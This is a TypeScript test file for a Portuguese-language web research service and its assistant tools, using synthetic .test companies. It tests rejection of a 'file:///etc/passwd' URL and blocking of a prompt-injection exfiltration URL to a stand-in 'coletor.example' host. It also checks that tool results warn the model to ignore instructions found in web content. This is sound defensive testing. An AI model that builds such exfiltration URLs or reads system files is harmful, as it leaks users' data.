import type { WebPage, WebSearchRequest, WebSearchResult } from '@prospector/contracts';
import { beforeEach, describe, expect, it } from 'vitest';
import {
  AppError,
  WEBSITE_PAGE_KEY,
  WEB_MENTION_KEY,
  companyTools,
  createCompanyService,
  createEvidenceService,
  createToolRegistry,
  createWebResearchService,
  pendingAudit,
  webResearchTools,
  type CompanyService,
  type PageFetchResult,
  type PageFetcher,
  type RequestContext,
  type WebResearchService,
  type WebResearchServiceDeps,
  type WebResearchUsageStore,
  type WebSearch,
  type WebSearchProviderResult,
} from '../src';
import { createMemoryAuditRepository, createMemoryCompanyRepository } from '../src/memory';
import { createMemoryWebResearchUsage } from '../src/memory/web-research-usage';

const ctx: RequestContext = {
  actor: { type: 'user' },
  traceId: '7c1e2d3f-4a5b-4c6d-8e7f-9a0b1c2d3e4f',
};

/** Resultados SINTÉTICOS (domínios .test reservados; nenhuma empresa real). */
const RESULTS: WebSearchResult[] = [
  {
    rank: 1,
    url: 'https://www.atelie-exemplo.test/sobre',
    title: 'Ateliê Exemplo | Móveis sob medida',
    snippet: 'Marcenaria em Curitiba desde 2015, com projetos residenciais.',
    publishedAt: null,
    score: 0.91,
  },
  {
    rank: 2,
    url: 'https://guia-exemplo.test/empresas/atelie-exemplo',
    title: 'Ateliê Exemplo — Guia de Empresas',
    snippet: '',
    publishedAt: '2026-10-01',
    score: 0.55,
  },
];

function deferred<T>() {
  let resolve!: (value: T) => void;
  const promise = new Promise<T>((r) => (resolve = r));
  return { promise, resolve };
}

function fakeSearch() {
  const calls: WebSearchRequest[] = [];
  let reply: WebSearchProviderResult | Error = { ok: true, results: RESULTS, creditsCharged: 1 };
  let gate: Promise<void> | null = null;
  const search: WebSearch = {
    provider: 'tavily',
    creditsPerSearch: 1,
    async search(request) {
      calls.push(request);
      if (gate) await gate;
      if (reply instanceof Error) throw reply;
      return structuredClone(reply);
    },
  };
  return {
    search,
    calls,
    respond: (next: WebSearchProviderResult | Error) => (reply = next),
    hold: () => {
      const d = deferred<void>();
      gate = d.promise;
      return () => {
        gate = null;
        d.resolve();
      };
    },
  };
}

function page(url: string, overrides: Partial<WebPage> = {}): WebPage {
  return {
    schemaVersion: 1,
    requestedUrl: url,
    url,
    httpStatus: 200,
    contentType: 'text/html',
    title: 'Ateliê Exemplo',
    description: 'Móveis sob medida em Curitiba.',
    lang: 'pt-BR',
    text: 'Ateliê Exemplo. Projetos de marcenaria residencial e comercial.',
    truncated: false,
    contentHash: 'b'.repeat(64),
    fetchedAt: '2026-11-10T12:00:00.000Z',
    renderer: 'browser',
    noArchive: false,
    ...overrides,
  };
}

function fakePages() {
  const calls: string[] = [];
  let reply: (url: string) => PageFetchResult = (url) => ({ ok: true, page: page(url) });
  const fetcher: PageFetcher = {
    async fetchPage(url) {
      calls.push(url);
      return reply(url);
    },
  };
  return { fetcher, calls, respond: (next: (url: string) => PageFetchResult) => (reply = next) };
}

describe('WebResearchService (D-AI-4)', () => {
  let now: Date;
  let usage: ReturnType<typeof createMemoryWebResearchUsage>;
  let provider: ReturnType<typeof fakeSearch>;
  let pages: ReturnType<typeof fakePages>;
  let repo: ReturnType<typeof createMemoryCompanyRepository>;
  let audit: ReturnType<typeof createMemoryAuditRepository>;
  let companies: CompanyService;
  let logs: string[];
  const clock = { now: () => now };

  function build(overrides: Partial<WebResearchServiceDeps> = {}): WebResearchService {
    return createWebResearchService({
      search: provider.search,
      pages: pages.fetcher,
      usage,
      companies: repo,
      evidence: repo,
      evidenceService: createEvidenceService({ evidence: repo, clock }),
      monthlyCreditBudget: 10,
      clock,
      log: (message) => logs.push(message),
      ...overrides,
    });
  }

  async function company(primaryDomain: string | null = 'atelie-exemplo.test') {
    const result = await companies.create(ctx, {
      schemaVersion: 1,
      displayName: 'Ateliê Exemplo',
      cnpj: null,
      primaryDomain,
      city: 'Curitiba',
      uf: 'PR',
    });
    return result.company;
  }

  beforeEach(() => {
    now = new Date('2026-11-10T12:00:00Z');
    usage = createMemoryWebResearchUsage();
    provider = fakeSearch();
    pages = fakePages();
    logs = [];
    audit = createMemoryAuditRepository({ clock });
    repo = createMemoryCompanyRepository({ audit, clock });
    companies = createCompanyService({
      companies: repo,
      evidence: repo,
      evidenceService: createEvidenceService({ evidence: repo, clock }),
      cnpjLookup: null,
      clock,
    });
  });

  describe('busca', () => {
    it('busca, registra o consumo e reaproveita a busca idêntica sem gastar crédito', async () => {
      const service = build();
      const first = await service.search(ctx, { query: 'marcenaria Curitiba' });
      expect(first).toMatchObject({ ok: true, fromCache: false, creditsCharged: 1 });
      expect(first.ok && first.results).toHaveLength(2);
      expect(provider.calls[0]).toMatchObject({ query: 'marcenaria Curitiba', region: 'br' });

      const again = await service.search(ctx, { query: '  Marcenaria   CURITIBA ' });
      expect(again).toMatchObject({ ok: true, fromCache: true, creditsCharged: 0 });
      expect(provider.calls).toHaveLength(1);
      expect(usage.entries()).toEqual([
        expect.objectContaining({ provider: 'tavily', units: 1, period: '2026-11', outcome: 'ok' }),
      ]);
    });

    it('o cache vence e a busca volta ao provedor', async () => {
      const service = build({ searchCacheTtlMs: 60_000 });
      await service.search(ctx, { query: 'marcenaria Curitiba' });
      now = new Date(now.getTime() + 61_000);
      await service.search(ctx, { query: 'marcenaria Curitiba' });
      expect(provider.calls).toHaveLength(2);
    });

    it('bloqueia ao atingir o orçamento do mês, sem chamar o provedor', async () => {
      const service = build({ monthlyCreditBudget: 2 });
      expect((await service.search(ctx, { query: 'consulta um' })).ok).toBe(true);
      expect((await service.search(ctx, { query: 'consulta dois' })).ok).toBe(true);
      const third = await service.search(ctx, { query: 'consulta três' });
      expect(third).toMatchObject({ ok: false, failure: 'budget_exhausted', provider: 'tavily' });
      expect(third.ok === false && third.message).toMatch(/orçamento/);
      expect(provider.calls).toHaveLength(2);
      // O que já foi buscado continua disponível pelo cache.
      expect((await service.search(ctx, { query: 'consulta um' })).ok).toBe(true);
    });

    it('orçamento zero desliga as buscas', async () => {
      const service = build({ monthlyCreditBudget: 0 });
      expect(await service.search(ctx, { query: 'consulta' })).toMatchObject({
        ok: false,
        failure: 'budget_exhausted',
      });
      expect(provider.calls).toHaveLength(0);
    });

    it('duas buscas simultâneas não passam juntas do limite', async () => {
      const service = build({ monthlyCreditBudget: 1 });
      const release = provider.hold();
      const a = service.search(ctx, { query: 'consulta a' });
      const b = service.search(ctx, { query: 'consulta b' });
      await new Promise((resolve) => setTimeout(resolve, 0));
      release();
      const outcomes = await Promise.all([a, b]);
      expect(outcomes.filter((o) => o.ok)).toHaveLength(1);
      expect(outcomes.filter((o) => !o.ok && o.failure === 'budget_exhausted')).toHaveLength(1);
      expect(provider.calls).toHaveLength(1);
    });

    it('o orçamento recomeça no mês seguinte (fuso da agência)', async () => {
      const service = build({ monthlyCreditBudget: 1 });
      expect((await service.search(ctx, { query: 'consulta um' })).ok).toBe(true);
      expect((await service.search(ctx, { query: 'consulta dois' })).ok).toBe(false);
      // 01/12 às 02:00 UTC ainda é 30/11 em São Paulo.
      now = new Date('2026-12-01T02:00:00Z');
      expect((await service.search(ctx, { query: 'consulta dois' })).ok).toBe(false);
      now = new Date('2026-12-01T12:00:00Z');
      expect((await service.search(ctx, { query: 'consulta dois' })).ok).toBe(true);
    });

    it('falha do provedor vira falha honesta, sem cache, e conta o que pode ter sido cobrado', async () => {
      const service = build();
      provider.respond({
        ok: false,
        failure: 'rate_limited',
        creditsCharged: 0,
        retryAfterSeconds: 30,
      });
      const failed = await service.search(ctx, { query: 'marcenaria Curitiba' });
      expect(failed).toMatchObject({
        ok: false,
        failure: 'rate_limited',
        retryAfterSeconds: 30,
      });
      expect(failed).not.toHaveProperty('results');
      provider.respond({ ok: true, results: RESULTS, creditsCharged: 1 });
      expect((await service.search(ctx, { query: 'marcenaria Curitiba' })).ok).toBe(true);
      expect(provider.calls).toHaveLength(2);
      expect(usage.entries().map((e) => [e.outcome, e.units])).toEqual([
        ['rate_limited', 0],
        ['ok', 1],
      ]);
    });

    it('adaptador que lança vira "fora do ar" e o crédito é contado por precaução', async () => {
      const service = build();
      provider.respond(new Error('boom'));
      expect(await service.search(ctx, { query: 'marcenaria Curitiba' })).toMatchObject({
        ok: false,
        failure: 'unavailable',
      });
      expect(usage.entries()[0]).toMatchObject({ outcome: 'unavailable', units: 1 });
      expect(logs.some((line) => line.includes('lançou erro'))).toBe(true);
    });

    it('sem registro de consumo, a reserva fica e o orçamento erra para menos', async () => {
      const failing: WebResearchUsageStore = {
        creditsUsed: async () => 0,
        record: async () => {
          throw new Error('banco fora');
        },
      };
      const service = build({ usage: failing, monthlyCreditBudget: 1 });
      expect((await service.search(ctx, { query: 'consulta um' })).ok).toBe(true);
      expect(await service.search(ctx, { query: 'consulta dois' })).toMatchObject({
        ok: false,
        failure: 'budget_exhausted',
      });
    });

    it('desligada ou sem chave: falha sem chamar nada', async () => {
      expect(await build({ search: 'disabled' }).search(ctx, { query: 'x y z' })).toMatchObject({
        ok: false,
        failure: 'disabled',
        provider: null,
      });
      expect(
        await build({ search: 'not_configured' }).search(ctx, { query: 'x y z' }),
      ).toMatchObject({ ok: false, failure: 'not_configured' });
      expect(provider.calls).toHaveLength(0);
    });

    it('recusa dado pessoal na consulta antes de qualquer chamada', async () => {
      const service = build();
      await expect(
        service.search(ctx, { query: 'contato fulano@exemplo.test' }),
      ).rejects.toBeInstanceOf(AppError);
      await expect(
        service.search(ctx, { query: 'dentista (20) 99123-4567' }),
      ).rejects.toMatchObject({ code: 'validation' });
      expect(provider.calls).toHaveLength(0);
    });

    it('fila cheia devolve "ocupado"', async () => {
      const service = build({ maxConcurrentSearches: 1, maxQueuedSearches: 0 });
      const release = provider.hold();
      const first = service.search(ctx, { query: 'consulta a' });
      await new Promise((resolve) => setTimeout(resolve, 0));
      expect(await service.search(ctx, { query: 'consulta b' })).toMatchObject({
        ok: false,
        failure: 'busy',
      });
      release();
      expect((await first).ok).toBe(true);
    });

    it('buscas idênticas simultâneas fazem uma chamada só', async () => {
      const service = build();
      const release = provider.hold();
      const a = service.search(ctx, { query: 'consulta igual' });
      const b = service.search(ctx, { query: 'consulta igual' });
      await new Promise((resolve) => setTimeout(resolve, 0));
      release();
      const [first, second] = await Promise.all([a, b]);
      expect(first).toMatchObject({ ok: true, fromCache: false, creditsCharged: 1 });
      expect(second).toMatchObject({ ok: true, fromCache: true, creditsCharged: 0 });
      expect(provider.calls).toHaveLength(1);
    });

    it('informa o consumo do mês', async () => {
      const service = build({ monthlyCreditBudget: 5 });
      await service.search(ctx, { query: 'consulta um' });
      expect(await service.status(ctx)).toEqual({
        search: 'enabled',
        pageReader: 'enabled',
        usage: {
          period: '2026-11',
          provider: 'tavily',
          creditsUsed: 1,
          creditsBudget: 5,
          creditsRemaining: 4,
        },
      });
      expect(await build({ search: 'not_configured', pages: 'disabled' }).status(ctx)).toEqual({
        search: 'not_configured',
        pageReader: 'disabled',
        usage: null,
      });
    });
  });

  describe('leitura de página', () => {
    it('lê, guarda em cache e repassa a falha do site', async () => {
      const service = build();
      const url = 'https://www.atelie-exemplo.test/';
      expect(await service.readPage(ctx, { url })).toMatchObject({ ok: true, fromCache: false });
      expect(await service.readPage(ctx, { url: `${url}#contato` })).toMatchObject({
        ok: true,
        fromCache: true,
      });
      expect(pages.calls).toHaveLength(1);

      pages.respond(() => ({ ok: false, failure: 'robots_disallowed', httpStatus: null }));
      const blocked = await service.readPage(ctx, { url: 'https://outro.test/' });
      expect(blocked).toMatchObject({ ok: false, failure: 'robots_disallowed' });
      expect(blocked.ok === false && blocked.message).toMatch(/robots\.txt/);
    });

    it('recusa endereço que não é http(s) e respeita o desligamento', async () => {
      await expect(build().readPage(ctx, { url: 'file:///etc/passwd' })).rejects.toMatchObject({
        code: 'validation',
      });
      expect(
        await build({ pages: 'disabled' }).readPage(ctx, { url: 'https://a.test/' }),
      ).toMatchObject({ ok: false, failure: 'disabled' });
      expect(pages.calls).toHaveLength(0);
    });

    it('leitor que lança vira "fora do ar"', async () => {
      pages.respond(() => {
        throw new Error('chromium caiu');
      });
      expect(await build().readPage(ctx, { url: 'https://a.test/' })).toMatchObject({
        ok: false,
        failure: 'unavailable',
      });
    });
  });

  describe('gravação no dossiê da empresa', () => {
    it('cada resultado vira fonte `search_result` com hipótese "a verificar", auditada', async () => {
      const service = build();
      const target = await company();
      const result = await service.searchForCompany(ctx, {
        companyId: target.id,
        query: 'Ateliê Exemplo Curitiba',
      });
      expect(result).toMatchObject({ recorded: 2, refreshed: 0 });

      const dossier = await companies.dossier(ctx, target.id);
      const mentions = dossier.claims.filter((view) => view.claim.key === WEB_MENTION_KEY);
      expect(mentions).toHaveLength(2);
      for (const view of mentions) {
        expect(view.claim.epistemicType).toBe('hypothesis');
        expect(view.claim.confidence).toBeNull();
        expect(view.band).toBe('unverified');
        expect(view.evidence[0]?.source?.kind).toBe('search_result');
        expect(view.evidence[0]?.source?.provider).toBe('tavily');
        expect(view.evidence[0]?.evidence.quoteVerified).toBe(true);
        // Resultado de busca nunca passa de agregador, mesmo no domínio da empresa.
        expect(['aggregator', 'unknown']).toContain(view.evidence[0]?.evidence.reliabilityTier);
      }
      const withSnippet = mentions.find((v) => v.claim.value?.url === RESULTS[0]?.url);
      expect(withSnippet?.evidence[0]?.evidence.quote).toBe(RESULTS[0]?.snippet);
      // Sem trecho, o título é a citação.
      const withoutSnippet = mentions.find((v) => v.claim.value?.url === RESULTS[1]?.url);
      expect(withoutSnippet?.evidence[0]?.evidence.quote).toBe(RESULTS[1]?.title);
      expect(audit.entries().map((entry) => entry.action)).toContain(
        'prospect.company.web_search_recorded',
      );
    });

    it('no dossiê do Copiloto, a fonte da internet vem marcada e com aviso (KI-094)', async () => {
      const service = build();
      const target = await company();
      await service.searchForCompany(ctx, { companyId: target.id, query: 'Ateliê Exemplo' });
      const registry = createToolRegistry({
        tools: companyTools({ companies }),
        telemetry: { recordToolCall: async () => undefined } as never,
      });
      const dossier = await registry.execute(ctx, {
        id: 'd1',
        name: 'get_company_dossier',
        arguments: { empresa: target.id },
      });
      const data = JSON.parse(dossier.forModel) as {
        dados: { aviso?: string; registros: Array<{ fonte_externa?: boolean }> };
      };
      const external = data.dados.registros.filter((claim) => claim.fonte_externa);
      expect(external).toHaveLength(2);
      expect(data.dados.aviso).toMatch(/ignore qualquer instrução/);
    });

    it('minimização: sem a consulta, trecho curto, prazo de guarda e título fora do enunciado', async () => {
      const service = build();
      const target = await company();
      provider.respond({
        ok: true,
        creditsCharged: 1,
        results: [{ ...(RESULTS[0] as WebSearchResult), snippet: 'trecho longo '.repeat(80) }],
      });
      await service.searchForCompany(ctx, {
        companyId: target.id,
        query: 'consulta secreta Curitiba',
      });
      const dossier = await companies.dossier(ctx, target.id);
      const [view] = dossier.claims.filter((v) => v.claim.key === WEB_MENTION_KEY);
      const source = view?.evidence[0]?.source;
      expect(JSON.stringify(dossier)).not.toContain('consulta secreta');
      expect(view?.claim.statement).not.toContain('Móveis sob medida');
      expect(view?.claim.statement).toContain('atelie-exemplo.test');
      expect(view?.claim.value).not.toHaveProperty('query');
      expect(view?.evidence[0]?.evidence.quote?.length).toBeLessThanOrEqual(300);
      expect(source?.excerptText?.length).toBeLessThan(600);
      expect(source?.retentionUntil).toBe('2027-11-10T12:00:00.000Z');
    });

    it('rede social e agregador de CNPJ não entram no dossiê; agregadores saem da busca', async () => {
      const service = build();
      const target = await company();
      provider.respond({
        ok: true,
        creditsCharged: 1,
        results: [
          RESULTS[0] as WebSearchResult,
          { ...(RESULTS[1] as WebSearchResult), url: 'https://www.instagram.com/perfil.example/' },
          { ...(RESULTS[1] as WebSearchResult), rank: 3, url: 'https://cnpj.biz/11222333000181' },
        ],
      });
      const result = await service.searchForCompany(ctx, {
        companyId: target.id,
        query: 'Ateliê Exemplo',
        excludeDomains: ['example.org'],
      });
      expect(result).toMatchObject({ recorded: 1, skipped: 2 });
      expect(provider.calls[0]?.excludeDomains).toEqual(
        expect.arrayContaining(['cnpj.biz', 'casadosdados.com.br', 'example.org']),
      );
      const urls = (await companies.dossier(ctx, target.id)).claims.map((v) => v.claim.value?.url);
      expect(urls).toEqual([RESULTS[0]?.url]);
    });

    it('empresa individual (MEI): nem busca nem leitura gravada, nada é enviado', async () => {
      const service = build();
      const withRegistry = createCompanyService({
        companies: repo,
        evidence: repo,
        evidenceService: createEvidenceService({ evidence: repo, clock }),
        cnpjLookup: {
          // Registro SINTÉTICO (CNPJ de teste com DV válido; nome de exemplo).
          lookup: async () => ({
            ok: true,
            fetchedAt: now.toISOString(),
            record: {
              schemaVersion: 1,
              provider: 'opencnpj',
              cnpj: '11222333000181',
              legalName: 'MARIA EXEMPLO',
              tradeName: null,
              status: 'active',
              statusSince: '2020-01-02',
              headquarters: true,
              activityStart: '2020-01-02',
              cnaeMain: { code: '3101-2/00', description: 'Fabricação de móveis' },
              cnaeSecondary: [],
              legalNature: 'Empresário (Individual)',
              legalNatureCode: '2135',
              size: 'me',
              isMei: true,
              simples: true,
              capitalCents: 100000,
              city: 'CURITIBA',
              uf: 'PR',
              providerUpdatedAt: '2026-11-01T00:00:00.000Z',
            },
          }),
        },
        clock,
      });
      const created = await withRegistry.importFromCnpj(ctx, { cnpj: '11222333000181' });
      if (created.status !== 'created') throw new Error('esperava criar');
      const id = created.company.id;
      const searched = await service.searchForCompany(ctx, { companyId: id, query: 'móveis' });
      expect(searched).toMatchObject({
        recorded: 0,
        outcome: { ok: false, failure: 'personal_data' },
      });
      const read = await service.readPageForCompany(ctx, { companyId: id, url: 'https://a.test/' });
      expect(read).toMatchObject({ recorded: false, outcome: { failure: 'personal_data' } });
      expect(provider.calls).toHaveLength(0);
      expect(pages.calls).toHaveLength(0);
    });

    it('página com noarchive: grava só endereço e título, sem texto', async () => {
      const service = build();
      const target = await company();
      pages.respond((url) => ({ ok: true, page: page(url, { noArchive: true }) }));
      expect(
        await service.readPageForCompany(ctx, {
          companyId: target.id,
          url: 'https://www.atelie-exemplo.test/sobre',
        }),
      ).toMatchObject({ recorded: true });
      const [view] = (await companies.dossier(ctx, target.id)).claims;
      const source = view?.evidence[0]?.source;
      expect(source?.excerptText).toBe('Ateliê Exemplo');
      expect(source?.licenseNote).toMatch(/não guardar cópia/);

      pages.respond((url) => ({ ok: true, page: page(url, { noArchive: true, title: null }) }));
      expect(
        await service.readPageForCompany(ctx, { companyId: target.id, url: 'https://b.test/' }),
      ).toMatchObject({ recorded: false });
    });

    it('página gravada guarda só o começo do texto, com prazo de guarda', async () => {
      const service = build();
      const target = await company();
      pages.respond((url) => ({ ok: true, page: page(url, { text: 'palavra '.repeat(2000) }) }));
      await service.readPageForCompany(ctx, {
        companyId: target.id,
        url: 'https://www.atelie-exemplo.test/sobre',
      });
      const source = (await companies.dossier(ctx, target.id)).claims[0]?.evidence[0]?.source;
      expect(source?.excerptText?.length).toBeLessThan(600);
      expect(source?.retentionUntil).toBe('2027-11-10T12:00:00.000Z');
    });

    it('a mesma coleta não é gravada duas vezes; coleta nova vira nova versão', async () => {
      const service = build({ searchCacheTtlMs: 60_000 });
      const target = await company();
      await service.searchForCompany(ctx, { companyId: target.id, query: 'Ateliê Exemplo' });
      expect(
        await service.searchForCompany(ctx, { companyId: target.id, query: 'Ateliê Exemplo' }),
      ).toMatchObject({ recorded: 0, refreshed: 0 });

      now = new Date(now.getTime() + 120_000);
      expect(
        await service.searchForCompany(ctx, { companyId: target.id, query: 'Ateliê Exemplo' }),
      ).toMatchObject({ recorded: 0, refreshed: 2 });
      const dossier = await companies.dossier(ctx, target.id);
      expect(dossier.claims.filter((v) => v.claim.key === WEB_MENTION_KEY)).toHaveLength(2);
      expect(dossier.historyCount).toBe(2);
    });

    it('busca que falha não grava nada', async () => {
      const service = build();
      const target = await company();
      provider.respond({
        ok: false,
        failure: 'unavailable',
        creditsCharged: 0,
        retryAfterSeconds: null,
      });
      const result = await service.searchForCompany(ctx, { companyId: target.id, query: 'Ateliê' });
      expect(result).toMatchObject({ recorded: 0, outcome: { ok: false, failure: 'unavailable' } });
      expect((await companies.dossier(ctx, target.id)).claims).toHaveLength(0);
    });

    it('página do domínio da empresa vira fato; de outro site, hipótese', async () => {
      const service = build();
      const target = await company('atelie-exemplo.test');
      const own = await service.readPageForCompany(ctx, {
        companyId: target.id,
        url: 'https://www.atelie-exemplo.test/sobre',
      });
      expect(own).toMatchObject({ recorded: true, epistemicType: 'fact' });
      const other = await service.readPageForCompany(ctx, {
        companyId: target.id,
        url: 'https://guia-exemplo.test/empresas/atelie-exemplo',
      });
      expect(other).toMatchObject({ recorded: true, epistemicType: 'hypothesis' });

      const dossier = await companies.dossier(ctx, target.id);
      const fact = dossier.claims.find((v) => v.claim.key === WEBSITE_PAGE_KEY);
      expect(fact?.claim.epistemicType).toBe('fact');
      expect(fact?.evidence[0]?.evidence.reliabilityTier).toBe('company_owned');
      expect(fact?.evidence[0]?.source).toMatchObject({ kind: 'web_page', httpStatus: 200 });
      expect(fact?.claim.confidence).toBeGreaterThan(0.8);
      expect(audit.entries().map((entry) => entry.action)).toContain(
        'prospect.company.web_page_recorded',
      );
    });

    it('página vazia ou que falhou não grava', async () => {
      const service = build();
      const target = await company();
      pages.respond((url) => ({ ok: true, page: page(url, { title: null, text: '   ' }) }));
      expect(
        await service.readPageForCompany(ctx, { companyId: target.id, url: 'https://a.test/' }),
      ).toMatchObject({ recorded: false, epistemicType: null });
      pages.respond(() => ({ ok: false, failure: 'access_denied', httpStatus: 403 }));
      expect(
        await service.readPageForCompany(ctx, { companyId: target.id, url: 'https://b.test/' }),
      ).toMatchObject({ recorded: false, outcome: { ok: false, httpStatus: 403 } });
      expect((await companies.dossier(ctx, target.id)).claims).toHaveLength(0);
    });

    it('empresa de demonstração grava fontes e claims marcados como demo', async () => {
      const service = build();
      const demo = await repo.create(
        {
          id: '0b1f8c9e-1d2a-4b3c-8d4e-5f6a7b8c9d0e',
          displayName: 'Empresa Demo',
          legalName: null,
          cnpj: null,
          primaryDomain: null,
          city: null,
          uf: null,
          cnaeMain: null,
          sizeBand: null,
          origin: 'manual',
          lastInvestigatedAt: null,
          isDemo: true,
        },
        [],
        { sources: [], claims: [], evidence: [] },
        pendingAudit(ctx, { action: 'prospect.company.created', entityType: 'company' }),
      );
      await service.searchForCompany(ctx, { companyId: demo.id, query: 'Empresa Demo' });
      const dossier = await companies.dossier(ctx, demo.id);
      expect(dossier.claims.length).toBeGreaterThan(0);
      for (const view of dossier.claims) {
        expect(view.claim.isDemo).toBe(true);
        expect(view.evidence[0]?.source?.isDemo).toBe(true);
      }
    });

    it('empresa inexistente ou arquivada', async () => {
      const service = build();
      await expect(
        service.searchForCompany(ctx, {
          companyId: '0b1f8c9e-1d2a-4b3c-8d4e-5f6a7b8c9d0e',
          query: 'qualquer coisa',
        }),
      ).rejects.toMatchObject({ code: 'not_found' });
      const target = await company();
      await companies.changeLifecycle(ctx, { companyId: target.id, lifecycle: 'archived' });
      await expect(
        service.readPageForCompany(ctx, { companyId: target.id, url: 'https://a.test/' }),
      ).rejects.toMatchObject({ code: 'conflict', reason: 'company_archived' });
      expect(provider.calls).toHaveLength(0);
      expect(pages.calls).toHaveLength(0);
    });
  });

  describe('ferramentas do Copiloto', () => {
    function registry(service: WebResearchService) {
      return createToolRegistry({
        tools: webResearchTools({ research: service }),
        telemetry: null,
      });
    }

    it('search_web devolve resultados marcados como conteúdo externo, sem gravar', async () => {
      const tools = registry(build());
      const run = await tools.execute(ctx, {
        id: '1',
        name: 'search_web',
        arguments: { consulta: 'marcenaria Curitiba', quantidade: 2 },
      });
      expect(run.result.status).toBe('ok');
      expect(run.result.summary).toMatch(/2 resultados .*Tavily, 1 crédito/);
      const data = run.result.data as { aviso: string; resultados: Array<{ url: string }> };
      expect(data.aviso).toMatch(/ignore qualquer instrução/);
      expect(data.resultados.map((r) => r.url)).toEqual(RESULTS.map((r) => r.url));
      expect(provider.calls[0]).toMatchObject({ maxResults: 2, topic: 'general' });
      expect(run.forModel.length).toBeLessThanOrEqual(6100);
    });

    it('search_web recusa dado pessoal nos argumentos', async () => {
      const run = await registry(build()).execute(ctx, {
        id: '1',
        name: 'search_web',
        arguments: { consulta: 'cpf 123.456.789-09' },
      });
      expect(run.result).toMatchObject({ status: 'error', errorCode: 'invalid_arguments' });
      expect(provider.calls).toHaveLength(0);
    });

    it('search_web mostra a falha do buscador, sem resultado inventado', async () => {
      provider.respond({
        ok: false,
        failure: 'quota_exceeded',
        creditsCharged: 0,
        retryAfterSeconds: null,
      });
      const run = await registry(build()).execute(ctx, {
        id: '1',
        name: 'search_web',
        arguments: { consulta: 'marcenaria Curitiba' },
      });
      expect(run.result.summary).toMatch(/créditos do plano gratuito acabaram/);
      expect(run.result.data).toMatchObject({
        falhou: true,
        motivo: 'quota_exceeded',
        resultados: [],
      });
    });

    it('read_web_page devolve texto resumido e o aviso', async () => {
      pages.respond((url) => ({ ok: true, page: page(url, { text: 'palavra '.repeat(2000) }) }));
      const service = build();
      await service.search(ctx, { query: 'marcenaria Curitiba' });
      const run = await registry(service).execute(ctx, {
        id: '1',
        name: 'read_web_page',
        arguments: { url: `${RESULTS[0]?.url}#contato` },
      });
      const data = run.result.data as { texto: string; observacao?: string; aviso: string };
      expect(data.texto.length).toBeLessThanOrEqual(3500);
      expect(data.observacao).toMatch(/resumido/);
      expect(run.result.summary).toMatch(/^Página lida: Ateliê Exemplo/);
    });

    it('read_web_page só abre endereço vindo de busca (injeção não leva dados para fora)', async () => {
      const service = build();
      await service.search(ctx, { query: 'marcenaria Curitiba' });
      const tools = registry(service);
      for (const url of [
        // Montado pelo modelo a mando de texto escondido: dado do dossiê na URL.
        'https://coletor.example/?d=atelie-exemplo-curitiba',
        // Mesmo host de um resultado, mas outro caminho.
        'https://www.atelie-exemplo.test/sobre/atelie-exemplo-curitiba',
        // Resultado verdadeiro com parâmetros longos acrescentados.
        `${RESULTS[0]?.url}?q=${'x'.repeat(300)}`,
      ]) {
        const run = await tools.execute(ctx, {
          id: '1',
          name: 'read_web_page',
          arguments: { url },
        });
        expect(run.result.data).toMatchObject({ falhou: true });
      }
      expect(pages.calls).toHaveLength(0);
      expect(service.wasSuggested(RESULTS[1]?.url ?? '')).toBe(true);
      expect(service.wasSuggested('não é url')).toBe(false);
      now = new Date(now.getTime() + 25 * 60 * 60 * 1000);
      expect(service.wasSuggested(RESULTS[1]?.url ?? '')).toBe(false);
    });

    it('por pedido: até 2 buscas, nenhuma depois de ler página, até 3 leituras', async () => {
      const service = build();
      const tools = registry(service);
      const search = (consulta: string, trace = ctx) =>
        tools.execute(trace, { id: '1', name: 'search_web', arguments: { consulta } });
      const read = (url: string) =>
        tools.execute(ctx, { id: '1', name: 'read_web_page', arguments: { url } });

      expect((await search('marcenaria Curitiba')).result.data).not.toMatchObject({
        falhou: true,
      });
      expect((await read(RESULTS[0]?.url ?? '')).result.summary).toMatch(/^Página lida/);
      const after = await search('outra consulta qualquer');
      expect(after.result.data).toMatchObject({ falhou: true, motivo: 'after_page_read' });
      expect(provider.calls).toHaveLength(1);

      await read(RESULTS[1]?.url ?? '');
      await read(RESULTS[0]?.url ?? '');
      const fourth = await read(RESULTS[1]?.url ?? '');
      expect(fourth.result.data).toMatchObject({ falhou: true, motivo: 'request_limit' });

      // Pedido novo do usuário (outro traceId) recomeça a contagem.
      const next = { ...ctx, traceId: '9d8c7b6a-5f4e-4d3c-8b2a-1f0e9d8c7b6a' };
      await search('consulta um', next);
      await search('consulta dois', next);
      const third = await search('consulta três', next);
      expect(third.result.data).toMatchObject({ falhou: true, motivo: 'request_limit' });
      expect(provider.calls).toHaveLength(3);
    });

    it('telemetria sem consulta, título nem URL completa', async () => {
      const recorded: Array<{ inputRedacted: unknown; outputSummary: string }> = [];
      const service = build();
      const tools = createToolRegistry({
        tools: webResearchTools({ research: service }),
        telemetry: {
          recordToolCall: async (call: { inputRedacted: unknown; outputSummary: string }) => {
            recorded.push(call);
          },
        } as never,
      });
      await tools.execute(ctx, {
        id: '1',
        name: 'search_web',
        arguments: { consulta: 'marcenaria Curitiba' },
      });
      await tools.execute(ctx, {
        id: '2',
        name: 'read_web_page',
        arguments: { url: RESULTS[0]?.url ?? '' },
      });
      const text = JSON.stringify(recorded);
      expect(text).not.toMatch(/marcenaria|Ateliê|\/sobre/);
      expect(recorded[0]?.inputRedacted).toMatchObject({ consulta: '[texto]' });
      expect(recorded[1]?.inputRedacted).toEqual({ host: 'www.atelie-exemplo.test' });
    });

    it('resultado de rede social chega ao modelo só com o endereço', async () => {
      provider.respond({
        ok: true,
        creditsCharged: 1,
        results: [
          {
            rank: 1,
            url: 'https://www.instagram.com/perfil.example/',
            title: 'Perfil Example (@perfil.example)',
            snippet: 'Fotos e vídeos de Perfil Example.',
            publishedAt: null,
            score: 0.8,
          },
        ],
      });
      const run = await registry(build()).execute(ctx, {
        id: '1',
        name: 'search_web',
        arguments: { consulta: 'marcenaria Curitiba' },
      });
      const data = run.result.data as { resultados: Array<Record<string, unknown>> };
      expect(data.resultados[0]).toEqual({
        posicao: 1,
        url: 'https://www.instagram.com/perfil.example/',
        observacao: expect.stringMatching(/só o endereço/),
      });
    });

    it('get_web_research_usage informa o que resta', async () => {
      const service = build({ monthlyCreditBudget: 3 });
      await service.search(ctx, { query: 'consulta um' });
      const run = await registry(service).execute(ctx, {
        id: '1',
        name: 'get_web_research_usage',
        arguments: {},
      });
      expect(run.result.summary).toBe(
        'Pesquisa ligada: 1 de 3 créditos usados em 2026-11, restam 2.',
      );
    });
  });
});
